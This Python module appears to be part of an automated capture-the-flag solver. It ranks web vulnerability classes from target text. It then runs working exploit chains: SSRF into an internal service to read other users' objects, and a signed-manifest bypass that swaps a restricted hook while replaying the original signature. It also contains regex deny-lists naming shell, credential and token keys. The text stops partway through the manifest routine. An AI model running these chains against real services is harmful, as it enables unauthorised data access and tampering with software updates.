#!/usr/bin/env python3
"""Recon-first dispatcher for exact, target-described Web exploit contracts.

The broad :mod:`proof_hunt` machinery already owns the mature readers for the
historical Web classes.  This peer supplies the missing front door: it ranks a
small discovery snapshot before the generic waves and closes two multi-step
contracts which cannot be expressed as a single payload against one route:

* SSRF -> an advertised internal case service -> non-owned object (IDOR);
* signed-manifest integrity bypass -> preserve the signed digest/signature and
  replace only the advertised hook with the one policy marks restricted.

Nothing here scans a host or follows an off-origin URL.  Discovery responses
are passed in by ``proof_hunt`` as controls.  The only URL sent over the wire is
always a same-origin target path; an internal URL is data supplied to that
target's exact fetch parameter.  A returned value is eligible only when the
class-specific exploit response contains one novel lowercase
``proof_<32 hex>`` value after all controls have been subtracted.

Interface (the same peer contract as the other cold readers)::

    solve(target, ctx) -> proof | None

``ctx`` supplies the scope-locked client, cached responses, absolute deadline,
request budget, stop event and a result sink.  The module has no standalone
network transport and cannot send a Game Master credential.
"""

from __future__ import annotations

import copy
import hashlib
import hmac
import json
import re
import sys
import time
import urllib.parse
from pathlib import Path


# ctf package import (script runs need the checkout root on sys.path)
try:
    from ctf import flagfmt
except ModuleNotFoundError:
    import sys as _sys
    from pathlib import Path as _Path
    _sys.path.append(str(_Path(__file__).resolve().parents[2]))
    from ctf import flagfmt

HERE = Path(__file__).resolve().parent
_TK = HERE.parent / "toolkits"
for _path in (_TK, HERE):
    if str(_path) not in sys.path:
        sys.path.insert(0, str(_path))

import web as _web  # noqa: E402 -- shared scope/route/inner-URL policy
import security_json as _security_json  # noqa: E402 -- duplicate-key rejecting JSON

try:
    import forge_event as _proofs  # noqa: E402 -- shared proof/carrier policy
except Exception:  # pragma: no cover - a partial export fails closed
    _proofs = None


MAX_TEXT = 400_000
MAX_DOCS = 24
MAX_ROUTE_BYTES = 1024
MAX_BODY_BYTES = 32 * 1024
MAX_RANKED = 8
DEADLINE_PAD = 0.3

_PROOF = flagfmt.PROOF_ANYCASE
_NAME = re.compile(r"^[A-Za-z_][A-Za-z0-9_.-]{0,63}$")
_OBJECT_ID = re.compile(r"^[A-Za-z0-9_.:-]{1,80}$")
_HASH_KEY = re.compile(r"(?i)(?:^|_)(?:sha_?256|artifact_?sha_?256|digest|hash)(?:$|_)")
_SIGNATURE_KEY = re.compile(r"(?i)(?:^|_)(?:signature|sig)(?:$|_)")
_DANGEROUS_MANIFEST_KEY = re.compile(
    r"(?i)(?:^|_)(?:callback|webhook|url|uri|host|command|cmd|shell|delete|remove|reset|"
    r"revoke|password|credential|token|secret)(?:$|_)"
)
_ACTIVE_MANIFEST_VALUE = re.compile(
    r"(?i)^\s*(?:(?:https?|file|gopher|dict|ftp|ldap|ws|wss|data|javascript):|//)"
)
_ROUTER_WORDS = {
    "ssrf_idor": re.compile(r"(?i)\b(?:ssrf|server[ _-]?side|internal[ _-]?(?:case|object|service)|case[ _-]?service)\b"),
    "signed_manifest": re.compile(r"(?i)\b(?:signed[ _-]?manifest|supply[ _-]?chain|artifact[ _-]?hook|update[ _-]?policy|signature)\b"),
    "idor": re.compile(r"(?i)\b(?:idor|bola|object[ _-]?level|non[ _-]?owned|other[ _-]?(?:user|tenant|account))\b"),
    "path_traversal_lfi": re.compile(r"(?i)\b(?:path[ _-]?traversal|lfi|local[ _-]?file|file[ _-]?(?:read|include))\b"),
    "command_injection": re.compile(r"(?i)\b(?:command[ _-]?injection|cmdi|shell|ping|nslookup|traceroute)\b"),
    "sqli": re.compile(r"(?i)\b(?:sqli|sql[ _-]?injection|query[ _-]?oracle)\b"),
    "jwt_auth": re.compile(r"(?i)\b(?:jwt|jwk|jku|alg(?:orithm)?[ _-]?confusion|bearer)\b"),
    "ssti": re.compile(r"(?i)\b(?:ssti|server[ _-]?side[ _-]?template|jinja|twig|mako|erb)\b"),
    # A normal HTML5 ``<!doctype html>`` is boilerplate, not XXE evidence.  A
    # non-HTML document type, an entity declaration, or explicit XXE/XML
    # entity language remains a useful rank signal; the exact XML reader still
    # independently requires its complete target-published contract before it
    # sends anything.
    "xxe": re.compile(
        r"(?i)(?:\bxxe\b|\bexternal[ _-]?entit(?:y|ies)\b|\bxml[ _-]?entit(?:y|ies)\b|"
        r"<!ENTITY\b|<!DOCTYPE\s+(?!html(?:\s|>)))"
    ),
    "upload": re.compile(r"(?i)\b(?:file[ _-]?upload|multipart|upload[ _-]?bypass|preview)\b"),
    "access_control": re.compile(r"(?i)\b(?:access[ _-]?control|priv(?:ilege)?[ _-]?esc|mass[ _-]?assignment|admin[ _-]?only)\b"),
    "flask_werkzeug": re.compile(r"(?i)\b(?:flask|itsdangerous|session[ _-]?cookie|secret[ _-]?key)\b"),
    "werkzeug_debug": re.compile(r"(?i)\b(?:werkzeug|debugger[ _-]?pin|evalex|werkzeug_debug_pin)\b"),
    "graphql": re.compile(r"(?i)\b(?:graphql|graphiql|introspection|apollo|federation)\b"),
    "open_redirect": re.compile(r"(?i)\b(?:open[ _-]?redirect|return[ _-]?url|redirect[ _-]?uri)\b"),
    "prototype_pollution": re.compile(r"(?i)\b(?:prototype[ _-]?pollution|__proto__|constructor\.prototype)\b"),
    "deserialization": re.compile(r"(?i)\b(?:deseriali[sz]|unserialize|pickle|object[ _-]?stream|yaml[ _-]?load)\b"),
    "dns_rebind": re.compile(r"(?i)\b(?:dns[ _-]?rebind|rebinding)\b"),
    "cloud_metadata": re.compile(r"(?i)\b(?:169\.254\.169\.254|imdsv?2?|metadata[ _-]?(?:service|endpoint))\b"),
    "crlf_response_split": re.compile(r"(?i)\b(?:crlf|response[ _-]?split|response[ _-]?header[ _-]?canary)\b"),
    "host_header": re.compile(r"(?i)\b(?:host[ _-]?header|x[ _-]?forwarded[ _-]?host|proxy[ _-]?host)\b"),
    "ldap_xpath_injection": re.compile(r"(?i)\b(?:ldap|xpath|boolean[ _-]?read[ _-]?injection)\b"),
    "json_rpc": re.compile(r"(?i)\b(?:json[ _-]?rpc|openrpc)\b"),
    "soap_wsdl": re.compile(r"(?i)\b(?:soap|wsdl)\b"),
    "grpc_web": re.compile(r"(?i)\b(?:grpc[ _-]?web|protobuf[ _-]?rpc)\b"),
    "synthetic_credential": re.compile(
        r"(?i)\b(?:synthetic[ _-]?(?:credential|account)|challenge[ _-]?account[ _-]?read)\b"),
    "upload_canary": re.compile(r"(?i)\b(?:readable|inert)[ _-]?upload[ _-]?canary\b"),
}
_CLASS_TIE_ORDER = {"ssrf_idor": 0, "signed_manifest": 1}  # read-only exact miss before one-shot POST

# One explicit ownership table for every class this recon layer can rank.  A
# ``cold`` entry names the existing production phase that is responsible for
# exploitation; ``exact`` entries execute in this module. ``contract-cold``
# routes only a complete machine-readable contract to ``recon_advanced``; its
# requirements deliberately state the variants which remain unsupported.
DISPATCH_PLAN = {
    "ssrf_idor": {"mode": "exact", "phase": "recon-router:ssrf-idor",
                   "requires": "clues + topology + case directory + exact outer and inner selectors"},
    "signed_manifest": {"mode": "exact", "phase": "recon-router:signed-manifest",
                         "requires": "unique restricted hook + verified original artifact digest"},
    "idor": {"mode": "ranked-cold", "phase": "proof-hunt:idor-feed-walk",
             "requires": "target-listed owned and non-owned object identifiers"},
    "path_traversal_lfi": {"mode": "ranked-cold", "phase": "proof-hunt:lfi",
                           "requires": "offered file parameter and prompt/clue named path"},
    "command_injection": {"mode": "ranked-cold", "phase": "proof-hunt:cmdi",
                          "requires": "advertised command surface plus computed marker"},
    "sqli": {"mode": "ranked-cold", "phase": "proof-hunt:get-sqli",
             "requires": "offered search parameter and differential control"},
    "jwt_auth": {"mode": "ranked-cold", "phase": "proof-hunt:jwt-read-replay",
                 "requires": "target-issued JWT and target-described denied read"},
    "ssti": {"mode": "ranked-cold", "phase": "proof-hunt:ssti-read",
             "requires": "reflection control plus computed template marker"},
    "xxe": {"mode": "ranked-cold", "phase": "peer:xxe-read",
            "requires": "exact XML POST schema and local-file marker control"},
    "upload": {"mode": "fixed-cold-fallback", "phase": "proof-hunt:upload-preview",
               "requires": "advertised upload, preview and template-variable contract"},
    "access_control": {"mode": "fixed-cold-fallback", "phase": "proof-hunt:access-read",
                       "requires": "advertised denied safe GET and exact role/action fields"},
    "graphql": {"mode": "ranked-cold", "phase": "peer:graphql-query-read",
                "requires": "advertised endpoint/reference and Query-only schema"},
    "cloud_metadata": {"mode": "contract-cold", "phase": "peer:recon-advanced",
                       "requires": "exact IMDSv2 outer URL/method/header relay contract and read-only metadata path; no generic header inference"},
    "flask_werkzeug": {"mode": "contract-cold", "phase": "peer:recon-advanced",
                        "requires": "target-issued Flask cookie plus target-published key, scalar claim and safe read; generic secret discovery remains unsupported"},
    "werkzeug_debug": {"mode": "contract-cold", "phase": "peer:recon-werkzeug",
                       "requires": "unique exact debugger contract with all six PIN inputs, matching version/algorithm, console secret and basename-only /run/huntress objective; no input discovery or target-supplied code"},
    "open_redirect": {"mode": "contract-cold", "phase": "peer:recon-advanced",
                      "requires": "exact same-origin redirect-to-SSRF chain and read-only internal destination; no redirect is followed by this client"},
    "prototype_pollution": {"mode": "contract-cold", "phase": "peer:recon-advanced",
                            "requires": "exact isolated-instance merge/readback contract, benign generated property, negative control and structural readback; generic gadget keys remain unsupported"},
    "deserialization": {"mode": "contract-cold", "phase": "peer:recon-advanced",
                        "requires": "exact parser/format contract for a generated inert primitive map/string plus named structural readback; native gadgets remain unsupported"},
    "dns_rebind": {"mode": "contract-cold", "phase": "peer:recon-advanced",
                   "requires": "exact target-advertised public rebinding URL, bounded request count and read-only payoff route; no hostname generation or direct resolution"},
    "crlf_response_split": {"mode": "contract-cold", "phase": "peer:recon-advanced",
                            "requires": "exact safe GET field, fixed inert response-header canary profile and clean control; no cookies, cache or executable body"},
    "host_header": {"mode": "contract-cold", "phase": "peer:recon-advanced",
                    "requires": "exact nonsensitive GET sink and nonresolving .invalid X-Forwarded-Host canary; transport Host is never changed"},
    "ldap_xpath_injection": {"mode": "contract-cold", "phase": "peer:recon-advanced",
                             "requires": "exact nonsensitive GET read field and fixed LDAP/XPath false/true profile; no authentication or extraction"},
    "json_rpc": {"mode": "contract-cold", "phase": "peer:recon-advanced",
                 "requires": "exact side-effect-free read operation, bounded inert scalar arguments and GET control"},
    "soap_wsdl": {"mode": "contract-cold", "phase": "peer:recon-advanced",
                  "requires": "exact side-effect-free SOAP read operation, bounded inert scalar arguments, GET control and strict entity-free XML payoff"},
    "grpc_web": {"mode": "contract-cold", "phase": "peer:recon-advanced",
                 "requires": "exact side-effect-free gRPC-Web read route, empty message and GET control; no reflection or client data"},
    "synthetic_credential": {"mode": "contract-cold", "phase": "peer:recon-advanced",
                             "requires": "complete challenge-synthetic account contract, isolated instance, denied read control and proof only from final GET"},
    "upload_canary": {"mode": "contract-cold", "phase": "peer:recon-advanced",
                      "requires": "isolated storage, exact upload/read routes, generated inert marker profile and absent-before/readback controls"},
}


def dispatch_plan(ranked):
    """Concrete ranked ownership records; detect-only rows never execute."""
    out = []
    for rank, row in enumerate(list(ranked or [])[:MAX_RANKED], 1):
        name = row.get("class") if isinstance(row, dict) else None
        spec = DISPATCH_PLAN.get(name)
        if spec is None:
            continue
        out.append(dict(spec, **{"class": name, "rank": rank,
                                "score": row.get("score", 0),
                                "evidence": list(row.get("evidence") or [])[:3]}))
    return out


def _left(ctx):
    deadline = ctx.get("deadline")
    return None if deadline is None else float(deadline) - time.time()


def _can_send(ctx):
    stop = ctx.get("stop")
    left = _left(ctx)
    return not (stop is not None and stop.is_set()) and (left is None or left > DEADLINE_PAD)


def _origin_host(url):
    try:
        return (urllib.parse.urlsplit(str(url or "")).hostname or "").lower().rstrip(".")
    except Exception:
        return ""


def _response(raw):
    if not isinstance(raw, dict):
        return None
    if "body" in raw:
        return raw
    if "text" in raw:
        out = dict(raw)
        out["body"] = str(raw.get("text") or "").encode("utf-8", "replace")
        return out
    return None


def _text_views(response, *, strict=True):
    if not isinstance(response, dict):
        return []
    if _proofs is not None and hasattr(_proofs, "response_text_views"):
        try:
            return [str(item)[:MAX_TEXT] for item in _proofs.response_text_views(response, strict=strict)]
        except Exception:
            return []
    body = response.get("body", response.get("text", ""))
    try:
        text = bytes(body).decode("utf-8", "strict") if isinstance(body, (bytes, bytearray)) else str(body or "")
    except Exception:
        return []
    return [text[:MAX_TEXT]]


def _baseline_text(response):
    if _proofs is not None and hasattr(_proofs, "response_baseline_text"):
        try:
            return _proofs.response_baseline_text(response)
        except Exception:
            marker = getattr(_proofs, "BASELINE_STRICT_INCOMPLETE",
                             "<!-- huntress-baseline-strict-set:incomplete -->")
            return marker
    return "\n".join(_text_views(response, strict=False))[:MAX_TEXT]


def _json_doc(response):
    views = _text_views(response)
    if not views:
        return None
    try:
        value = _security_json.loads_unique(views, max_chars=MAX_TEXT)
    except Exception:
        return None
    return value if isinstance(value, (dict, list)) else None


def _preloaded(ctx, base_url):
    """Canonical query-free cache, rejecting aliases/collisions."""
    out, raw_keys, collided = {}, {}, set()
    items = list((ctx.get("preloaded") or {}).items())
    if len(items) > 160:
        return {}
    for raw_path, raw_response in items:
        if not isinstance(raw_path, str):
            continue
        try:
            route = _web.safe_preloaded_route_key(raw_path, base_url, max_bytes=MAX_ROUTE_BYTES)
        except Exception:
            route = None
        if not route or route in collided:
            continue
        if route in raw_keys and raw_keys[route] != raw_path:
            out.pop(route, None)
            collided.add(route)
            continue
        response = _response(raw_response)
        if response is not None:
            raw_keys[route] = raw_path
            out[route] = response
    return out


def _safe_route(value, base_url, *, allow_query=False):
    try:
        return _web.safe_same_origin_route(
            value, base_url, allow_query=allow_query, guard_query=True,
            max_bytes=MAX_ROUTE_BYTES,
        )
    except Exception:
        return None


def _route_value(doc, keys, base_url, default=None, *, allow_query=False):
    if isinstance(doc, dict):
        for key in keys:
            route = _safe_route(doc.get(key), base_url, allow_query=allow_query)
            if route:
                return route
    return _safe_route(default, base_url, allow_query=allow_query) if default else None


def _documents(cache):
    return {path: _json_doc(response) for path, response in list(cache.items())[:MAX_DOCS]}


def _document_route(docs, clues, keys, default, base_url=None, discovery_routes=None):
    """Resolve a discovery document by its clue-advertised route, then default.

    ``docs`` is already keyed by canonical same-origin paths.  A rotated path
    therefore works without granting authority to an arbitrary URL or falling
    back to a similarly shaped sibling document.
    """
    candidates = []
    if isinstance(clues, dict):
        candidates.extend(clues.get(key) for key in keys)
    if isinstance(discovery_routes, dict):
        candidates.extend(discovery_routes.get(key) for key in keys)
    candidates.append(default)
    for raw in candidates:
        route = (_safe_route(raw, base_url) if base_url else raw)
        if isinstance(route, str) and route in docs:
            return route, docs.get(route)
    return None, None


def _flatten_strings(value, *, cap=240):
    out, stack = [], [value]
    while stack and len(out) < cap:
        item = stack.pop()
        if isinstance(item, dict):
            for key, child in list(item.items())[:120]:
                out.append(str(key)[:200])
                stack.append(child)
        elif isinstance(item, list):
            stack.extend(reversed(item[:120]))
        elif isinstance(item, (str, int, float, bool)):
            out.append(str(item)[:500])
    return out


def fingerprint(cache, prompt="", base_url=None, discovery_routes=None):
    """Return evidence-ranked class names from already-fetched target bytes.

    This is reconnaissance only.  It never treats a class word as authority to
    send a mutation; the two executable routes below require their complete
    structural contracts independently.
    """
    docs = _documents(cache)
    clues = docs.get("/api/clues")
    _topology_route, topology = _document_route(
        docs, clues, ("topology_route", "case_service_route"), "/api/topology", base_url,
        discovery_routes)
    _cases_route, cases = _document_route(
        docs, clues, ("case_directory_route", "cases_route"), "/api/cases", base_url,
        discovery_routes)
    _updates_route, updates = _document_route(
        docs, clues, ("update_feed", "updates_route"), "/api/updates", base_url,
        discovery_routes)
    _policy_route, policy = _document_route(
        docs, clues, ("update_policy", "update_policy_route", "policy_route"),
        "/api/update-policy", base_url, discovery_routes)
    raw_signals = []
    for path, response in list(cache.items())[:MAX_DOCS]:
        raw_signals.append(str(path)[:500])
        raw_signals.extend(_text_views(response, strict=False)[:2])
        headers = response.get("response_headers", response.get("headers", {}))
        if isinstance(headers, dict):
            raw_signals.extend(
                f"{str(key)[:100]}: {str(value)[:500]}"
                for key, value in list(headers.items())[:80]
            )
    corpus = "\n".join([str(prompt or "")[:20_000]] + [
        " ".join(_flatten_strings(doc)) for doc in docs.values() if doc is not None
    ] + raw_signals)[:120_000]
    scores, evidence = {}, {}

    def add(name, score, why):
        scores[name] = scores.get(name, 0) + score
        evidence.setdefault(name, []).append(why)

    if (isinstance(clues, dict) and isinstance(topology, dict)
            and isinstance(cases, (dict, list))
            and any(str(key).lower().endswith("service") for key in topology)):
        add("ssrf_idor", 120, "clues+topology+case-directory")
    if (isinstance(clues, dict) and isinstance(updates, (dict, list))
            and isinstance(policy, dict)):
        update_words = " ".join(_flatten_strings(updates)).lower()
        policy_words = " ".join(_flatten_strings(policy)).lower()
        if "hook" in update_words and "signature" in update_words and "hook" in policy_words:
            add("signed_manifest", 120, "signed update+hook policy")
    for name, regex in _ROUTER_WORDS.items():
        if regex.search(corpus):
            add(name, 20, "target text")
    ranked = sorted(scores, key=lambda name: (
        -scores[name], _CLASS_TIE_ORDER.get(name, 100), name))[:MAX_RANKED]
    return [{"class": name, "score": scores[name], "evidence": evidence[name][:3]} for name in ranked]


def _proof_meta(response, baselines, host, *, anchored=True):
    if _proofs is not None and hasattr(_proofs, "extract_success"):
        try:
            result = dict(_proofs.extract_success(response, baseline_texts=baselines, host=host))
        except Exception:
            return {"success": False, "auto": None, "candidates": [], "baseline_incomplete": True}
        if not anchored:
            result["auto"] = None
            result["success"] = False
        return result
    text = "\n".join(_text_views(response))
    baseline_values = {match.group(0).lower() for value in baselines for match in _PROOF.finditer(str(value))}
    values = list(dict.fromkeys(match.group(0) for match in _PROOF.finditer(text)
                                if match.group(0).lower() not in baseline_values))
    auto = values[0] if anchored and len(values) == 1 and values[0] == values[0].lower() else None
    return {"success": bool(auto), "auto": auto, "candidates": values[1:] if auto else values,
            "baseline_incomplete": False}


def _baseline_proofs(baselines):
    return list(dict.fromkeys(match.group(0).lower()
                              for text in list(baselines or [])[:120]
                              for match in _PROOF.finditer(str(text or ""))))[:24]


def _query(route, name, value):
    base, _, query = str(route).partition("?")
    pairs = [(key, item) for key, item in urllib.parse.parse_qsl(query, keep_blank_values=True)
             if key != name]
    pairs.append((name, value))
    return base + "?" + urllib.parse.urlencode(pairs)


def _parameter(clues, feature_doc, feature_route=None):
    keys = ("query_parameter", "url_parameter", "fetch_parameter", "input_parameter", "target_parameter")
    for doc in (feature_doc, clues):
        if not isinstance(doc, dict):
            continue
        for key in keys:
            value = doc.get(key)
            if isinstance(value, str) and _NAME.fullmatch(value):
                return value
        for key, value in doc.items():
            if (isinstance(key, str) and key.endswith(("_required", "_missing"))
                    and bool(value)):
                stem = key.rsplit("_", 1)[0]
                if _NAME.fullmatch(stem):
                    return stem
    # A clue may advertise the fetch control as ``/proxy?destination=``.  The
    # parameter name is authority only when that already-validated route names
    # exactly one URL-shaped key; an arbitrary or ambiguous query never turns
    # into a default ``target`` guess.
    query = urllib.parse.urlsplit(str(feature_route or "")).query
    names = [name for name, _value in urllib.parse.parse_qsl(query, keep_blank_values=True)
             if re.search(r"(?i)(?:^|[_-])(?:url|uri|target|destination|dest|endpoint|fetch|proxy)(?:$|[_-])",
                          name)]
    names = list(dict.fromkeys(names))
    if len(names) == 1 and _NAME.fullmatch(names[0]):
        return names[0]
    return None


def _case_rows(cases):
    if isinstance(cases, dict):
        for key in ("cases", "objects", "records", "items"):
            if isinstance(cases.get(key), list):
                return cases[key][:80]
        if all(isinstance(value, dict) for value in cases.values()) and len(cases) <= 80:
            return list(cases.values())
    return cases[:80] if isinstance(cases, list) else []


def _unique_alias(doc, keys, allowed_types):
    if not isinstance(doc, dict):
        return None
    values = [doc.get(key) for key in keys if key in doc]
    if (not values or any(not isinstance(value, allowed_types) or isinstance(value, bool)
                          for value in values)):
        return None
    distinct = list(dict.fromkeys(str(value) for value in values))
    return values[0] if len(distinct) == 1 else None


def _case_urls(base, object_id, selector=None, *, path_ids=False):
    value = str(object_id)
    parsed = urllib.parse.urlsplit(base)
    pairs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    out = []
    if isinstance(selector, str) and _NAME.fullmatch(selector):
        q = [(key, item) for key, item in pairs if key != selector] + [(selector, value)]
        out.append(urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, parsed.path or "/",
                                           urllib.parse.urlencode(q), "")))
    if path_ids:
        path = parsed.path or "/"
        replaced = False
        for marker in ("{id}", "{case_id}", "{object_id}", ":id", ":case_id", ":object_id"):
            if marker in path:
                path = path.replace(marker, urllib.parse.quote(value, safe=""))
                replaced = True
        if not replaced:
            path = path.rstrip("/") + "/" + urllib.parse.quote(value, safe="")
        out.append(urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, path, parsed.query, "")))
    return list(dict.fromkeys(out))[:2]


def _case_selector(clues, topology, service, row_selector):
    """Derive the internal object's selector; never guess a conventional key."""
    exact = []
    for doc in (topology, clues):
        if not isinstance(doc, dict):
            continue
        for key in (
                "case_parameter", "case_id_parameter", "object_parameter",
                "object_id_parameter", "record_parameter", "record_id_parameter",
                "selector_parameter"):
            value = doc.get(key)
            if isinstance(value, str) and _NAME.fullmatch(value):
                exact.append(value)
    exact = list(dict.fromkeys(exact))
    if len(exact) == 1:
        return exact[0]
    if len(exact) > 1:
        return None
    pairs = urllib.parse.parse_qsl(urllib.parse.urlsplit(service).query, keep_blank_values=True)
    names = list(dict.fromkeys(name for name, _value in pairs if _NAME.fullmatch(name)))
    if len(names) == 1:
        return names[0]
    if len(names) > 1:
        return None
    return row_selector if isinstance(row_selector, str) and _NAME.fullmatch(row_selector) else None


def _path_ids_advertised(clues, topology, service):
    path = urllib.parse.urlsplit(service).path
    markers = ("{id}", "{case_id}", "{object_id}", ":id", ":case_id", ":object_id")
    if any(marker in path for marker in markers):
        return True
    for doc in (topology, clues):
        if not isinstance(doc, dict):
            continue
        for key in ("path_ids", "id_in_path", "case_id_in_path", "object_id_in_path"):
            if doc.get(key) is True:
                return True
        for key in ("case_url_template", "object_url_template", "record_url_template"):
            value = doc.get(key)
            if isinstance(value, str) and any(marker in value for marker in markers):
                return True
    return False


def _ssrf_idor(target, ctx, cache, docs, baselines):
    clues = docs.get("/api/clues")
    base_url = str(target.get("url") or "")
    _topology_route, topology = _document_route(
        docs, clues, ("topology_route", "case_service_route"), "/api/topology", base_url,
        ctx.get("discovery_routes"))
    _cases_route, cases = _document_route(
        docs, clues, ("case_directory_route", "cases_route"), "/api/cases", base_url,
        ctx.get("discovery_routes"))
    if not isinstance(clues, dict) or not isinstance(topology, dict):
        return None
    feature = _route_value(
        clues, ("feature_route", "fetch_route", "proxy_route"), base_url,
        allow_query=True,
    )
    route_allowed = ctx.get("route_allowed")
    if (not feature or not callable(route_allowed)
            or not bool(route_allowed(feature))):
        return None
    raw_service = _unique_alias(topology, (
        "case_service", "object_service", "record_service", "internal_service", "backend_service"
    ), str)
    try:
        service = _web.safe_internal_url(raw_service, max_bytes=4096)
    except Exception:
        service = None
    role = _unique_alias(clues, ("current_role", "current_user", "owner", "principal"), (str, int))
    victims, row_selectors = [], set()
    for row in _case_rows(cases):
        if not isinstance(row, dict):
            continue
        id_fields = [(key, row.get(key)) for key in ("id", "case_id", "object_id", "record_id")
                     if isinstance(row.get(key), (str, int)) and not isinstance(row.get(key), bool)
                     and _OBJECT_ID.fullmatch(str(row.get(key)))]
        if len(id_fields) != 1:
            if id_fields:
                return None
            continue
        id_field, object_id = id_fields[0]
        row_selectors.add(id_field)
        owner = _unique_alias(row, ("owner", "role", "user", "principal"), (str, int))
        if any(key in row for key in ("owner", "role", "user", "principal")) and owner is None:
            return None
        if role is not None and owner is not None and str(owner) == str(role):
            continue
        if role is not None and owner is None:
            continue
        victims.append(object_id)
    row_selector = next(iter(row_selectors)) if len(row_selectors) == 1 else None
    selector = _case_selector(clues, topology, service, row_selector) if service else None
    path_ids = _path_ids_advertised(clues, topology, service) if service else False
    if not service or role is None or not victims or (not selector and not path_ids):
        return None
    client = ctx.get("client")
    if client is None or not _can_send(ctx):
        return None
    requests = 0
    # The route's no-argument response is a control and may publish the odd
    # parameter name used by a rotated instance.
    control = cache.get(feature)
    if control is None:
        control = _response(client.get(feature, allow_redirects=False))
        requests += 1
    control_doc = _json_doc(control)
    local_baselines = list(baselines)
    if control is not None:
        local_baselines.append(_baseline_text(control))
    parameter = _parameter(clues, control_doc, feature)
    if parameter is None:
        return {"proof": None, "requests": requests, "success": False,
                "class": "ssrf_idor", "candidates": [],
                "baseline_proofs": _baseline_proofs(local_baselines)}
    host = _origin_host(base_url)
    all_candidates = []
    for object_id in victims[:4]:
        for inner in _case_urls(service, object_id, selector, path_ids=path_ids):
            if not _can_send(ctx):
                return {"proof": None, "requests": requests, "success": False,
                        "stopped": "deadline", "candidates": all_candidates,
                        "baseline_proofs": _baseline_proofs(local_baselines)}
            exploit_route = _query(feature, parameter, inner)
            if not bool(route_allowed(exploit_route)):
                continue
            response = _response(client.get(exploit_route, allow_redirects=False))
            requests += 1
            meta = _proof_meta(response, local_baselines, host, anchored=True)
            all_candidates.extend(meta.get("candidates") or [])
            if meta.get("auto"):
                return {"proof": meta["auto"], "requests": requests, "success": True,
                        "class": "ssrf_idor", "candidates": all_candidates[:12],
                        "baseline_incomplete": bool(meta.get("baseline_incomplete")),
                        "baseline_proofs": _baseline_proofs(local_baselines)}
    return {"proof": None, "requests": requests, "success": False,
            "class": "ssrf_idor", "candidates": all_candidates[:12],
            "baseline_proofs": _baseline_proofs(local_baselines)}


def _restricted_hook(policy):
    if not isinstance(policy, dict):
        return None
    restricted = []

    def add(value):
        if isinstance(value, str) and _NAME.fullmatch(value) and value not in restricted:
            restricted.append(value)
            return True
        return False

    for key in ("restricted_hook", "privileged_hook"):
        if key in policy and not add(policy.get(key)):
            return None
    if "restricted_hooks" in policy:
        values = policy.get("restricted_hooks")
        if not isinstance(values, list) or len(values) != 1:
            return None
        item = values[0]
        if isinstance(item, dict):
            item = item.get("name") or item.get("hook") or item.get("id")
        if not add(item):
            return None

    hooks = policy.get("hooks")
    rows = []
    if isinstance(hooks, dict):
        rows = [dict(value, name=name) if isinstance(value, dict) else {"name": name, "access": value}
                for name, value in list(hooks.items())[:40]]
    elif isinstance(hooks, list):
        rows = [row for row in hooks[:40] if isinstance(row, dict)]
    for row in rows:
        name = row.get("name") or row.get("hook") or row.get("id")
        if not isinstance(name, str) or not _NAME.fullmatch(name):
            continue
        access = str(row.get("access") or row.get("level") or row.get("policy") or "").lower()
        is_restricted = row.get("restricted") is True or access in {
            "restricted", "privileged", "admin", "internal", "forbidden", "protected"
        }
        if is_restricted:
            add(name)
    return restricted[0] if len(restricted) == 1 else None


def _updates(value):
    if isinstance(value, dict):
        for key in ("updates", "releases", "manifests", "items"):
            if isinstance(value.get(key), list):
                return value[key][:20]
        return [value] if isinstance(value.get("artifact"), dict) else []
    return value[:20] if isinstance(value, list) else []


def _safe_manifest(update, restricted):
    if not isinstance(update, dict) or not isinstance(update.get("artifact"), dict):
        return None
    if len(json.dumps(update, separators=(",", ":"), default=str).encode("utf-8")) > MAX_BODY_BYTES:
        return None
    artifact = update["artifact"]
    original = artifact.get("hook")
    if not isinstance(original, str) or not _NAME.fullmatch(original) or original == restricted:
        return None
    # Replaying the signed envelope is itself a state transition.  Refuse an
    # otherwise-unmodified nested callback/command/URL field (or a URL-shaped
    # scalar hidden under an innocent key): activating that envelope could do
    # materially more than switch the one reviewed hook.  Bound the walk even
    # though the JSON body is already size-limited.
    stack, nodes = [(update, 0)], 0
    while stack:
        value, depth = stack.pop()
        nodes += 1
        if nodes > 512 or depth > 12:
            return None
        if isinstance(value, dict):
            for key, child in value.items():
                if _DANGEROUS_MANIFEST_KEY.search(str(key)):
                    return None
                stack.append((child, depth + 1))
        elif isinstance(value, list):
            stack.extend((child, depth + 1) for child in value)
        elif isinstance(value, str) and _ACTIVE_MANIFEST_VALUE.search(value):
            return None
    # The observed contract signs a top-level named digest of the compact
    # ORIGINAL artifact.  Refuse ambiguous/missing integrity fields and prove
    # that the advertised digest really describes the bytes we are about to
    # tamper before replaying its signature.
    hash_keys = [key for key in update if _HASH_KEY.search(str(key))]
    signature_keys = [key for key in update if _SIGNATURE_KEY.search(str(key))]
    if len(hash_keys) != 1 or len(signature_keys) != 1:
        return None
    digest = update.get(hash_keys[0])
    signature = update.get(signature_keys[0])
    if (not isinstance(digest, str) or not re.fullmatch(r"[0-9A-Fa-f]{64}", digest)
            or not isinstance(signature, str) or not signature or len(signature) > 4096
            or any(char.isspace() or ord(char) < 0x20 for char in signature)):
        return None
    try:
        compact = json.dumps(
            artifact, separators=(",", ":"), ensure_ascii=False,
            allow_nan=False,
        ).encode("utf-8")
    except (TypeError, ValueError, UnicodeError):
        return None
    actual = hashlib.sha256(compact).hexdigest()
    if not hmac.compare_digest(actual, digest.lower()):
        return None
    # A manifest contract should not smuggle a second network target or an
    # unrelated active operation into the body we replay.
    tampered = copy.deepcopy(update)
    tampered["artifact"]["hook"] = restricted
    if (tampered.get(hash_keys[0]) != digest
            or tampered.get(signature_keys[0]) != signature):
        return None
    # Deep-copy plus one assignment must be the whole transformation.  This
    # check makes that invariant explicit even if the schema grows later.
    restored = copy.deepcopy(tampered)
    restored["artifact"]["hook"] = original
    if restored != update:
        return None
    return tampered


def _signed_manifest(target, ctx, cache, docs, baselines):
    clues = docs.get("/api/clues")
    base_url = str(target.get("url") or "")
    _updates_route, updates_doc = _document_route(
        docs, clues, ("update_feed", "updates_route"), "/api/updates", base_url,
        ctx.get("discovery_routes"))
    _policy_route, policy = _document_route(
        docs, clues, ("update_policy", "update_policy_route", "policy_route"),
        "/api/update-policy", base_url, ctx.get("discovery_routes"))
    if not isinstance(clues, dict) or not isinstance(policy, dict):
        return None
